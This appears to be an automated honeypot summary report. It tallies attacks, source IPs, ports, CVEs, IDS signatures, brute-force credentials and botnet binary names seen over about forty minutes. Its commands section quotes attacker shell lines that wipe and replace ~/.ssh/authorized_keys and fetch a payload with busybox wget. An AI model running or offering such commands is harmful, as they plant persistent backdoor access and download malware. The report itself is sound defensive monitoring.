
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-02T13:01:25Z
**Timeframe:** 2025-10-02T12:20:01Z to 2025-10-02T13:00:01Z
**Files Used:**
- agg_log_20251002T122001Z.json
- agg_log_20251002T124001Z.json
- agg_log_20251002T130001Z.json

## Executive Summary

This report summarizes 12,127 attacks recorded by the honeypot network. The majority of attacks were SSH brute-force attempts and SMB exploitation attempts. A significant number of attacks targeted Cisco ASA devices. The most notable observation is the high number of DoublePulsar backdoor installation attempts.

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 5278
- **Ciscoasa:** 2678
- **Suricata:** 2414
- **Dionaea:** 528
- **Mailoney:** 871
- **Honeytrap:** 161
- **Tanner:** 45
- **ConPot:** 29
- **Adbhoney:** 27
- **H0neytr4p:** 31
- **ElasticPot:** 8
- **Heralding:** 9
- **Sentrypeer:** 11
- **Honeyaml:** 10
- **Dicompot:** 10
- **Redishoneypot:** 11
- **Miniprint:** 3
- **Ipphoney:** 3

### Top Attacking IPs
- 177.66.215.88: 1439
- 159.223.80.225: 1243
- 161.132.37.66: 1048
- 81.215.207.182: 409
- 185.156.73.166: 356
- 92.63.197.55: 352
- 92.63.197.59: 320
- 103.49.238.104: 259
- 103.217.145.144: 252
- 143.110.252.83: 240
- 125.94.106.195: 278
- 118.193.43.244: 214

### Top Targeted Ports/Protocols
- TCP/445: 1436
- 445: 416
- 22: 890
- 25: 871
- 1433: 52
- 80: 52
- 23: 35
- TCP/22: 83
- TCP/1433: 56
- TCP/5432: 35
- 443: 32

### Most Common CVEs
- CVE-2021-3449
- CVE-2019-11500
- CVE-2021-35394
- CVE-2016-6563
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517

### Commands Attempted by Attackers
- `uname -a`
- `whoami`
- `cat /proc/cpuinfo | grep name | wc -l`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
- `cd /data/local/tmp/; busybox wget http://...`
- `Enter new UNIX password:`

### Signatures Triggered
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1432
- ET DROP Dshield Block Listed Source group 1: 167
- ET SCAN NMAP -sS window 1024: 171
- ET SCAN Suspicious inbound to MSSQL port 1433: 54
- ET INFO Reserved Internal IP Traffic: 60
- ET SCAN Potential SSH Scan: 49
- ET SCAN Suspicious inbound to PostgreSQL port 5432: 29

### Users / Login Attempts
- root/adminHW
- postgres/postgres
- test/zhbjETuyMffoL8F
- 345gs5662d34/345gs5662d34
- foundry/foundry
- root/2glehe5t24th1issZs
- awsgui/awsgui
- dolphinscheduler/dolphinscheduler
- root/passwd

### Files Uploaded/Downloaded
- wget.sh
- w.sh
- c.sh
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

### HTTP User-Agents
- No data recorded.

### SSH Clients and Servers
- No data recorded.

### Top Attacker AS Organizations
- No data recorded.

## Key Observations and Anomalies

- The high number of events related to the DoublePulsar backdoor (signature 2024766) from IP 177.66.215.88 is a strong indicator of a targeted campaign to exploit SMB vulnerabilities.
- A significant number of reconnaissance and system information gathering commands were observed, indicating that attackers are actively profiling the honeypots for further exploitation.
- The variety of credentials used in brute-force attacks suggests that attackers are using common and default credential lists.
- Multiple download attempts for ARM and x86 binaries with the name `urbotnetisass` were observed, likely related to IoT botnet propagation.
